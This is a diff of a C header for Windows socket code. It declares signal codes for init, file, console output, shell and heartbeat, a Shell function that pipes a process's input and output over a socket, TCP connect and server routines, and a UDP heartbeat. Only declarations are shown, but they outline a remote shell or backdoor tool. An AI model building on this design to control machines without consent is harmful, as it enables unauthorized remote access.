@@ -11,12 +11,10 @@
 #include <signal.h>
 
 
-extern const char _SIG_INIT[2];
-extern const char _SIG_FILE[2];
-extern const char _SIG_COUT[2];
-extern const char _SIG_SHLL[2];
-extern const char _SIG_HRBT[2];
+enum SIG  {_SIG_INIT = 0x00, _SIG_HRBT= 0xff, _SIG_FILE = 0x01, _SIG_COUT = 0x02, _SIG_SHLL = 0x03};
 
+
+#define DEFAULT_PORT_UDP 55555
 /* --- UTILS --- */
 
 void DBGLG(char buf[], ...);
@@ -30,11 +28,12 @@ int InitSetup(void);
 int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sockt);
 int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt);
 int Shell(PROCESS_INFORMATION pi, SOCKET sock);
-
+int Cout(SOCKET sockt, ...);
+int File(SOCKET sockt, ...);
 
 /* --- TCP --- */
 
-int IpSetupINIT(struct addrinfo** _ad_info, char* ip);
+int IpSetupTCP(struct addrinfo** _ad_info, char* ip);
 int Connect(SOCKET* ConnectSocket, struct addrinfo* ad_info);
 int SetupSocketTCP(struct addrinfo **ad_info);
 int SetupServerTCP(SOCKET* ListenSocket);
@@ -42,8 +41,9 @@ int SetupServerTCP(SOCKET* ListenSocket);
 
 /* --- UDP --- */
 
-int SetupServerUDP(SOCKET* _socku);
-int SetupHeartBeatUDP(SOCKET* _socku, struct sockaddr_in* _ad_info, const char* ip);
-int HeartBeat(const char* ip, HANDLE* killme);
+int SetupClientUDP(SOCKET* _socku_c);
+int GenerateSockaddrin(SOCKADDR_IN* ptr, char* ip, short port);
+int SendUDP(SOCKET socku, SOCKADDR_IN* sa, char* data, int len);
+int HeartBeat(SOCKET socku, SOCKADDR_IN* sa);
 
 #endif
